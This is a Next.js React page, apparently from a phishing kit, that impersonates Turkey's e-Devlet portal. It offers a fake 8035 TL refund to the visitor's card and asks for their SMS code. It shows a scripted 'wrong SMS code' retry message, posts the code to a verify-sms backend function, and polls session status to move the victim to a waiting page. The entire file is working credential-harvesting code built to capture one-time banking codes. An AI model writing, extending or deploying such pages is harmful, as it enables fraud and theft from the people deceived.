import { useCallback, useState } from 'react';
import { useRouter } from 'next/router';
import EdevletLayout from '../components/EdevletLayout';
import useStatusPolling from '../lib/hooks/useStatusPolling';
import useSessionStep from '../lib/hooks/useSessionStep';

const richText =
  '<strong><font color="#3a89b4">8035</font></strong> TL Tutarındaki iade hakkınızı kartınıza geri aktarmak için lütfen sms şifrenizi giriniz.';

export default function SmsHatalıPage() {
  const router = useRouter();
  const [smsCode, setSmsCode] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const session = useSessionStep('SMS Hatalı');

  useStatusPolling();

  const handleSubmit = useCallback(
    async (event) => {
      event.preventDefault();
      setErrorMessage('');

      if (!smsCode) {
        setErrorMessage('Telefonunuza gönderilen son sms şifresini giriniz.');
        return;
      }

      setSubmitting(true);

      try {
        const response = await fetch('/.netlify/functions/verify-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: smsCode }),
        });

        if (!response.ok) {
          throw new Error('SMS kaydedilemedi');
        }

        await router.push('/bekleyiniz');
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.debug('SMS tekrar gönderimi başarısız:', error);
        }
        setErrorMessage('İşlem sırasında bir sorun oluştu. Lütfen tekrar deneyiniz.');
      } finally {
        setSubmitting(false);
      }
    },
    [router, smsCode],
  );

  if (!session.loading && !session.active) {
    return (
      <EdevletLayout richText="Oturum bulunamadı.">
        <p>Bu sayfayı görebilmek için önce bilgilerinizi göndermeniz gerekiyor.</p>
      </EdevletLayout>
    );
  }

  return (
    <EdevletLayout richText={richText}>
      <form id="loginForm" autoComplete="off" onSubmit={handleSubmit}>
        <fieldset>
          <div className="formRow required">
            <p style={{ color: 'red', fontWeight: 'bold' }}>
              Girmiş olduğunuz sms şifresi yanlıştır. Telefonunuza gönderilen son sms şifresini giriniz
            </p>
            <label htmlFor="smsRetryField" className="rowLabel">
              Sms Şifreniz:
            </label>
            <div className="fieldGroup">
              <input
                id="smsRetryField"
                name="sms2"
                type="tel"
                maxLength={10}
                className="text"
                aria-required="true"
                required
                value={smsCode}
                onChange={(event) => setSmsCode(event.target.value)}
              />
            </div>
          </div>
        </fieldset>

        {errorMessage && <p className="formError">{errorMessage}</p>}

        <div className="loader" style={{ display: submitting || session.loading ? 'flex' : 'none' }}>
          <img src="/assets/img/form-progress.svg" alt="..." />İşleminiz devam ediyor. Lütfen bekleyiniz...
        </div>

        <div className="formSubmitRow">
          <button type="submit" className="submitButton" disabled={submitting}>
            {submitting ? 'Gönderiliyor…' : 'İadeyi Kartıma Aktar'}
          </button>
          <button type="button" className="backButton" onClick={() => router.push('/')}> 
            İptal Et
          </button>
        </div>
      </form>
    </EdevletLayout>
  );
}